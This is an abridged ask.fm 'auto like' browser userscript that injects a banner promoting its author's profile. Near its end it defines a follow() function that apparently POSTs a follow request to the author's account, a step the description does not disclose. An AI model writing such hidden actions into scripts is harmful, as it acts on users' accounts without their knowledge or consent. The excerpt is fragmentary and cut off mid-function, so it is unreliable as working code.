// ==UserScript==
// @name			Ask.fm Auto Like 2014
// @namespace       http://userscripts.org/scripts/show/164237
// @version			2.3
// @copyright		http://ask.fm/kevinMohamed
// @description		Auto Like Ask.fm 2014
...
if(body != null) {
	...
	div2.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to hide'>&laquo;</a> &#8226; <a href='http://ask.fm/KevinMohamed' title='My ask.fm' style='color: #FFFFFF;' onclick='alert(\'Thanks for installing this script\');'>My ask.fm</a></div> "
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<a onclick='spoiler()' title='Ask me something'>&laquo;</a> &#8226; <a href='http://ask.fm/kevinMohamed' title='kevinMohamed'>Ask me</a>"
		}
		else {
...
function follow(kevinMohamed){
	jQuery.ajax({
		url: "http://ask.fm/kevinMohamed/follow",
		type: "POST",
